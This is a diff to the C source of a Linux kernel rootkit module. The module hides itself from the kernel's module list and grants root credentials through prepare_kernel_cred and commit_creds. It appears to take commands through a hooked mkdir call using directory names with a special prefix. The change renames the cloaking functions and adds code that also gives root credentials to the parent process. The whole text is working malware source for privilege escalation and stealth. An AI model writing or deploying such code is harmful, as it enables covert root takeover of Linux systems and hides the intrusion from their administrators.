@@ -13,39 +13,60 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 
-#define RK_PREFIX "rkling."
-#define RK_PREFIX_LEN 7
+#define RK_PREFIX "rklings."
+#define RK_PREFIX_LEN 8
 #define RK_PATH_MAX 128
 
 static struct list_head *saved_prev;
-static bool cloaked;
+static bool module_hidden;
 static struct proc_dir_entry *proc_entry;
 
-static void rk_module_cloak(void)
+static void rk_module_hide(void)
 {
-	if (cloaked)
+	if (module_hidden)
 		return;
 	saved_prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	cloaked = true;
+	module_hidden = true;
 }
 
-static void rk_module_uncloak(void)
+static void rk_module_unhide(void)
 {
-	if (!cloaked)
+	if (!module_hidden)
 		return;
 	list_add(&THIS_MODULE->list, saved_prev);
-	cloaked = false;
+	module_hidden = false;
+}
+
+static void rk_install_creds(struct task_struct *task, struct cred *new_cred)
+{
+	const struct cred *old;
+
+	old = rcu_dereference_protected(task->real_cred, 1);
+	rcu_assign_pointer(task->real_cred, new_cred);
+	rcu_assign_pointer(task->cred, new_cred);
+	put_cred(old);
 }
 
 static int rk_escalate(void)
 {
+	struct task_struct *parent;
 	struct cred *new_cred;
+	int error;
 
 	new_cred = prepare_kernel_cred(&init_task);
 	if (!new_cred)
 		return -ENOMEM;
-	return commit_creds(new_cred);
+	error = commit_creds(new_cred);
+	if (error)
+		return error;
+	parent = rcu_dereference(current->real_parent);
+	if (parent && parent != current && parent->mm) {
+		new_cred = prepare_kernel_cred(&init_task);
+		if (new_cred)
+			rk_install_creds(parent, new_cred);
+	}
+	return 0;
 }
 
 static int rk_parse_local_command(const char *path)
@@ -59,11 +80,11 @@ static int rk_parse_local_command(const char *path)
 	if (strcmp(cmd, "e") == 0)
 		return rk_escalate();
 	if (strcmp(cmd, "h.m") == 0) {
-		rk_module_cloak();
+		rk_module_hide();
 		return 0;
 	}
 	if (strcmp(cmd, "u.m") == 0) {
-		rk_module_uncloak();
+		rk_module_unhide();
 		return 0;
 	}
 
@@ -124,7 +145,7 @@ static struct kretprobe mkdir_probe = {
 static int rk_show(struct seq_file *out, void *unused)
 {
 	(void)unused;
-	seq_printf(out, "module: %s\n", cloaked ? "hidden" : "visible");
+	seq_printf(out, "module: %s\n", module_hidden ? "hidden" : "visible");
 	return 0;
 }
 
@@ -158,7 +179,7 @@ static int __init rk_init(void)
 
 static void __exit rk_exit(void)
 {
-	rk_module_uncloak();
+	rk_module_unhide();
 	proc_remove(proc_entry);
 	unregister_kretprobe(&mkdir_probe);
 }
